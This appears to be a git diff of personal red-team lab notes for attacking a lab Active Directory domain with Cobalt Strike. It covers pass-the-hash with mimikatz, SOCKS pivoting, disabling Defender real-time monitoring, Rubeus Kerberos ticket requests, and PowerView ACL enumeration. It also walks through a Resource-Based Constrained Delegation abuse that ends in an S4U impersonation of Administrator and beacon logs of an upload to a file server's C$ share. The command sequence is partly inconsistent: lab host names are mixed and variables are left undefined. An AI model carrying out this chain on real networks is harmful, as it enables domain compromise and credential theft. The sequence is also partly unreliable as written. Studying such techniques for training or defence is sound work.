@@ -374,10 +374,234 @@ jump scshell64 enc-jmp-1.contoso.enclave smb
 ```
 
 
+# we are good till above commands
+
 ```
 krb_asktgt /user:Administrator /aes256:8121c218316a59fcc5db080b204dbe21750d9cdd47e84df441784bbe1d0db2bc
 ```
 
 ```
 mimikatz sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:0dde0e62341ba59c5520fab03d0d06bd /run:%COMSPEC%
+```
+
+# I guess its Resource-Based Constrained Delegation
+
+So we should do this:
+
+## Socks via beacon
+```
+socks 1080 socks5
+```
+## Adding proxy
+1. **Profile > Proxy Servers**
+2. Click **Add**.
+3. Address: +++10.0.0.5+++
+4. Port: +++1080+++
+5. Protocol: **SOCKS Version 5**
+6. Click **OK**.
+
+## Proxification Rules
+1. Click **Add**.
+2. Name: +++Beacon+++
+3. Target hosts: +++10.10.120.0/23+++  # i will make it to my contoso.enclave CIDR.
+4. Action: **Proxy SOCKS5 10.0.0.5**
+5. Click **OK**.
+
+## DNS conf
+Open Powershell with Admin level access
+
+```
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.124.1 enc-dc-1 enc-dc-1.contoso.enclave contoso.enclave"
+```
+
+Change it to your case!
+
+## Defender
+Turn Off defender
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+
+## Creds
+Run this
+```
+runas /netonly /user:CONTOSO powershell
+```
+
+Request a service ticket for LDAP through the proxy.
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/enc-dc-1 /dc:enc-dc-1 /ptt
+```
+
+## Enumeration
+
+1. Import PowerView.
+```
+ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
+```
+
+2. Find principals that have _WriteProperty_ privileges on the _msDS-AllowedToActOnBehalfOfOtherIdentity_ attribute of computers.
+```
+Get-DomainComputer -Server 'enc-dc-1' | Get-DomainObjectAcl -Server 'enc-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
+```
+-> Make it to your case!
+
+THIS ONE WORKED!
+```
+Get-DomainComputer -Server 'enc-dc-1' |
+    Get-DomainObjectAcl -Server 'enc-dc-1' |
+    ? {
+        $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and
+        $_.ActiveDirectoryRights -Match 'WriteProperty'
+    } |
+    select ObjectDN, SecurityIdentifier
+```
+
+> This will show that a principal ending in RID 1107 has this privilege over multiple computers.
+
+
+This reutnr this:
+
+```
+usncreated : 20560 grouptype : DOMAIN_LOCAL_SCOPE, SECURITY samaccounttype : ALIAS_OBJECT samaccountname : Enclave Access whenchanged : 4/4/2025 9:39:21 PM objectsid : S-1-5-21-1330904164-3792538338-293942156-2103 objectclass : {top, group} cn : Enclave Access usnchanged : 20569 dscorepropagationdata : 1/1/1601 12:00:00 AM name : Enclave Access distinguishedname : CN=Enclave Access,CN=Users,DC=contoso,DC=enclave member : CN=S-1-5-21-1076548718-1118529210-2193484809-2601,CN=ForeignSecurityPrincipals,DC=contoso,DC=enclave whencreated : 4/4/2025 9:36:29 PM instancetype : 4
+```
+3. Query LDAP to discover what this SID is (a user or group, etc).
+```
+Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-1330904164-3792538338-293942156-2103)' -Server 'enc-dc-1'
+```
+> This will show that it’s a domain group called “Server Admins”, and that rsteel is a member.
+
+4. Go back to Cobalt Strike and use the high-integrity Beacon to dump the TGT for rsteel.
+
+5. In the netonly process on the Attacker Desktop, purge LDAP ticket for pchilds.
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
+```
+
+6. Request a new LDAP service ticket with rsteel’s TGT.
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/enc-dc-1 /dc:enc-dc-1 /ptt
+```
+
+
+**This one worked!**
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/enc-dc-1 /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:[INTER-REALM] /ptt
+```
+# Exploitation
+
+```PowerShell
+Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'enc-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
+
+OR:
+
+```
+‌powerpick Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server enc-dc-1 | Select-Object Name, PrincipalsAllowedToDelegateToAccount
+```
+> This shows that there’s already an RBCD configuration between lon-ws-1 and lon-fs-1. We need to be careful not to remove this by mistake.
+
+2. Add a new RBCD config between _lon-fs-1_ and _lon-wkstn-1_, making sure not to overwrite the existing entry.
+
+```powershell
+$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
+
+$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
+
+Set-ADComputer -Identity 'enc-fs-1' -PrincipalsAllowedToDelegateToAccount $jmp1,$fs1 -Server 'enc-dc-1'
+```
+
+3. Verifying...
+```powershell
+Get-ADComputer -Identity 'enc-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'enc-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
+
+4. Go back to Cobalt Strike again, and dump the TGT for _lon-wkstn-1_.
+> So we need the computer ticket?
+
+5. Then forge a ticket with the following command
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:enc-jmp-1$ /impersonateuser:Administrator /msdsspn:cifs/enc-fs-1 /ticket:[TGT] /dc:enc-dc-1 /outfile:C:\Users\Attacker\Desktop\
+```
+
+6. To auth
+```
+make_token ENCLAVE\admin FakePass
+```
+
+```
+kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
+```
+
+7. to check the permission
+```
+
+```
+
+To restore:
+```powershell
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
+
+
+Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
+
+
+
+profffe
+
+```
+  Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/23/2025 15:44:52   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     04/10/2025 12:54:51   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     11/09/2026 03:50:42   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     04/04/2025 21:14:29   System Volume Information
+          dir     04/04/2025 21:14:29   Users
+          dir     04/18/2025 12:09:20   Windows
+ 12kb     fil     11/08/2026 19:48:30   DumpStack.log.tmp
+ 1gb      fil     11/08/2026 19:48:30   pagefile.sys
+
+[11/09 06:29:29] beacon> cd \\enc-fs-1\c$
+[11/09 06:29:29] [*] cd \\enc-fs-1\c$
+[11/09 06:29:29] [+] host called home, sent: 29 bytes
+[11/09 06:29:31] beacon> pwd
+[11/09 06:29:31] [*] Tasked beacon to print working directory
+[11/09 06:29:32] [+] host called home, sent: 16 bytes
+[11/09 06:29:32] [*] Current directory is \\enc-fs-1\c$
+[11/09 06:30:24] beacon> upload C:\Users\Attacker\Desktop\rto.txt
+[11/09 06:30:24] [*] Tasked beacon to upload C:\Users\Attacker\Desktop\rto.txt as rto.txt
+[11/09 06:30:24] [+] host called home, sent: 39 bytes
+[11/09 06:30:28] beacon> ls
+[11/09 06:30:28] [*] Tasked beacon to list files in .
+[11/09 06:30:28] [+] host called home, sent: 27 bytes
+[11/09 06:30:28] [*] Listing: \\enc-fs-1\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/23/2025 15:44:52   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     04/10/2025 12:54:51   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     11/09/2026 03:50:42   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     04/04/2025 21:14:29   System Volume Information
+          dir     04/04/2025 21:14:29   Users
+          dir     04/18/2025 12:09:20   Windows
+ 12kb     fil     11/08/2026 19:48:30   DumpStack.log.tmp
+ 1gb      fil     11/08/2026 19:48:30   pagefile.sys
+ 12b      fil     11/09/2026 06:30:24   rto.txt
+
+[11/09 06:30:32] beacon> pwd
+[11/09 06:30:32] [*] Tasked beacon to print working directory
+[11/09 06:30:32] [+] host called home, sent: 16 bytes
+[11/09 06:30:32] [*] Current directory is \\enc-fs-1\c$
 ```
